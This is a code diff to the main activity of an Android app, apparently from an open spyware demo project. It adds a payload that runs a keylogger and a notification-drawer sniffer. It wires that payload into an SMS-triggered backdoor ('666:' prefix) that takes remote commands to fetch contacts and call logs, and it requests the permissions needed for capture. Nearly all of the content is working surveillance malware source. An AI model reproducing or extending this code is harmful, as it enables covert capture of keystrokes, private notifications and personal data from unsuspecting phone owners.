@@ -4,10 +4,14 @@ import android.Manifest
 import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
+import com.evilthreads.drawersnifferlib.DrawerSniffer
 import com.evilthreads.evade.evade
 import com.evilthreads.keylogger.Keylogger
 import com.evilthreads.smsbackdoor.SmsBackdoor
 import com.kotlinpermissions.KotlinPermissions
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import kotlinx.coroutines.withContext
 
 /*
             (   (                ) (             (     (
@@ -34,13 +38,23 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
-        evade {
-            KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
-                SmsBackdoor.openDoor(this, "666:", payload = {
+        val payload = suspend{
+            withContext(Dispatchers.Default){
+                val keyloggerJob = launch {
                     Keylogger.subscribe { entry ->
                         Log.d("KEYLOGGER", entry.toString())
                     }
-                }){ remoteCommand ->
+                }
+                launch {
+                    DrawerSniffer.subscribe { notification ->
+                        Log.d("DRAWERSNIFFER", notification.toString())
+                    }
+                }.join()
+                keyloggerJob.join()
+            }
+        }
+            KotlinPermissions.with(this).permissions(Manifest.permission.RECEIVE_SMS).onAccepted {
+                SmsBackdoor.openDoor(this, "666:", payload = payload){ remoteCommand ->
                     when(remoteCommand){
                         "COMMAND_GET_CONTACTS" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THESE CONTACTS")
                         "COMMAND_GET_CALL_LOG" -> Log.d(TAG, "PICKPOCKET ISN'T WORKING OR ELSE I'D GET THE CALL LOG")
@@ -49,7 +63,9 @@ class MainActivity : AppCompatActivity() {
                     }
                 }
                 Keylogger.requestPermission(this)
+                if(!DrawerSniffer.hasPermission(this))
+                    DrawerSniffer.requestPermission(this)
             }.ask()
-        }
+
     }
 }
